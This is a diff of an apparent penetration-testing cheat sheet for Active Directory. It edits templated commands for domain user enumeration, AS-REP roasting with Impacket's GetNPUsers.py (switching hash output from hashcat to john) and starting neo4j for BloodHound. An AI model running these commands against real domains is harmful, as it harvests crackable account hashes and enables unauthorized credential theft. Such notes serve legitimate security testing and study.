@@ -659,9 +659,9 @@ net user {USERNAME} /domain
 net group /domain
 
 # ASREP ROAST
-python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -request {DOMAIN1}.{DOMAIN2}/ -dc-ip {IP ADDRESS} -format hashcat
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -request {DOMAIN1}.{DOMAIN2}/ -dc-ip {IP ADDRESS} -format john
 
-python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py {DOMAIN1}.{DOMAIN2}/ -dc-ip {IP ADDRESS} -userfile {USER.txt} -format hashcat
+python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py {DOMAIN1}.{DOMAIN2}/ -dc-ip {IP ADDRESS} -usersfile {USER.txt} -format john
 
 # Bloodhound
 sudo ./usr/bin/neo4j console                                     # LHOST
